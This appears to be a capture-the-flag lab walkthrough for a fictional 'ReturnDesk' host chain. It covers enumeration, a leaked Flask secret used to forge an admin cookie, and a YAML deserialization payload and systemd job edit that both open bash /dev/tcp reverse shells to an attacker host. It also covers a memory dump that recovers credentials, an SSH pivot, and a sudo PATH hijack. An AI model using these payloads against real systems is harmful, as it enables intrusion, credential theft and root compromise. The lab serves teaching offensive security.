# Exploitation Guide for ReturnDesk: Dead Letter Queue

## Learning Objectives

This lab demonstrates a full chain from external web enumeration to internal host compromise. The intended lessons are release artifact exposure, leaked application secrets, Flask session forgery, unsafe YAML deserialization, root execution through a writable `systemd` timer job, process-memory credential recovery, internal pivoting, and sudo `PATH` hijacking.

## Enumeration

Start with a TCP scan against the externally reachable host:

```bash
nmap <returndesk-web-ip>
```

Expected exposed services:

```text
22/tcp open  ssh
80/tcp open  http
```

Browse to the web application. It presents a ReturnDesk staff portal and exposes normal-looking static assets.

## Source Artifact Discovery

Use directory and API fuzzing against the web application:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://<returndesk-web-ip>/FUZZ -ic

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://<returndesk-web-ip>/api/build-FUZZ -ic
```

The API fuzzing discovers:

```text
/releases
/api/build-info
```

Query that endpoint:

```bash
curl http://<returndesk-web-ip>/api/build-info
```

The response includes a release artifact:

```json
{
  "version": "2026.04.1",
  "commit": "9f31c7a",
  "artifact": "returndesk-2026.04.1.tar.gz",
  "channel": "warehouse-staging"
}
```

The `/releases/` directory returns `403`, but direct artifact access is allowed:

```bash
curl -o returndesk-2026.04.1.tar.gz http://<returndesk-web-ip>/releases/returndesk-2026.04.1.tar.gz
tar -xzf returndesk-2026.04.1.tar.gz
```

Reviewing the extracted files reveals a staging `.env` from the leaked release package:

```text
FLASK_SECRET_KEY=8d55a4b3a9b0e31c64f1a3d23c58b9e7
```

## Admin Session Forgery

The leaked `.env` contains the Flask signing secret. Use it to create an admin session cookie. One practical method is `flask-unsign`:

The `/admin` route trusts `session["role"]` from Flask's signed client-side session cookie. It does not validate the role against a server-side permission store, so recovering `FLASK_SECRET_KEY` makes it possible to forge a valid cookie with `role=admin`.

```bash
pipx install flask-unsign
flask-unsign --sign --cookie "{'role':'admin'}" --secret '8d55a4b3a9b0e31c64f1a3d23c58b9e7'
```

Use the resulting cookie to access:

```text
http://<returndesk-web-ip>/admin
```

The admin dashboard links to the policy-management workflow at:

```text
http://<returndesk-web-ip>/admin/import-policy
```

## Foothold through Unsafe YAML

The admin policy import uses unsafe YAML deserialization. Create a YAML payload that executes a reverse shell:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/443 0>&1'"
```

Start a listener:

```bash
sudo nc -lvnp 443
```

The intended lab path uses TCP/443 because `returndesk-web` egress is restricted to web traffic plus internal SSH.

Upload the payload:

```bash
curl -i -b "session=<signed-cookie>" \
  -F "policy=@policy.yml" \
  http://<returndesk-web-ip>/admin/import-policy
```

The shell lands as `returndesk`.

Read the local flag:

```bash
cat /home/returndesk/local.txt
```

## Privilege Escalation on ReturnDesk Web

Enumerate writable files owned by the application user:

```bash
find /opt/returndesk -writable -type f 2>/dev/null
```

The reconciliation job is writable:

```text
/opt/returndesk/jobs/reconcile.sh
```

Enumerate scheduled `systemd` jobs and inspect the reconciliation unit:

```bash
systemctl list-timers --all
systemctl cat returndesk-reconcile.service
```

Enumeration confirms that a `systemd` timer triggers `returndesk-reconcile.service`. The service's `ExecStart` points to `/opt/returndesk/jobs/reconcile.sh`, and because the unit does not set `User=`, `systemd` executes it as root by default.

Append a reverse-shell payload so the next scheduled run connects back as root:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/80 0>&1"' >> /opt/returndesk/jobs/reconcile.sh
```

Start a listener on the attacker machine before the timer runs:

```bash
sudo nc -lvnp 80
```

Wait for the scheduled job to execute. Once the reverse shell connects, confirm the privilege context and read the root flag:

```bash
id
cat /root/proof.txt
```

## Memory-Dump Pivot

As root on `returndesk-web`, locate the archive sync process:

```bash
ps aux | grep archive-sync-agent
```

This service periodically writes dead-letter return manifests from `returndesk-web` to ArchiveNode:

```bash
ls -la /opt/returndesk/archive-outbox
tail -n 5 /var/log/returndesk-archive-sync.log
```

Dump process memory:

```bash
gcore -o /tmp/archive-sync <pid>
strings /tmp/archive-sync.<pid> | grep ARCHIVE
```

Recover the internal credentials:

```text
ARCHIVE_HOST=10.10.20.20
ARCHIVE_USER=archadmin
ARCHIVE_PASS=ReturnVault-Sync-2026!
```

SSH to the internal machine from `returndesk-web`:

```bash
sshpass -p 'ReturnVault-Sync-2026!' ssh archadmin@10.10.20.20
```

Read the ArchiveNode local flag:

```bash
cat /home/archadmin/local.txt
```

## Privilege Escalation on ArchiveNode

Check sudo permissions:

```bash
sudo -l
```

Expected result:

```text
(root) NOPASSWD: /usr/local/bin/archive-maint
```

Inspect the script:

```bash
cat /usr/local/bin/archive-maint
```

The script sets a PATH that starts with `/home/archadmin/bin` and then calls `cleanup-manifests` without an absolute path.

Create a malicious command earlier in PATH:

```bash
mkdir -p /home/archadmin/bin
echo '#!/usr/bin/env bash' > /home/archadmin/bin/cleanup-manifests
echo '/bin/bash -p' >> /home/archadmin/bin/cleanup-manifests 
chmod +x /home/archadmin/bin/cleanup-manifests
```

Run the allowed maintenance command:

```bash
sudo /usr/local/bin/archive-maint
```

Confirm root and read the final flag:

```bash
id
cat /root/proof.txt
```
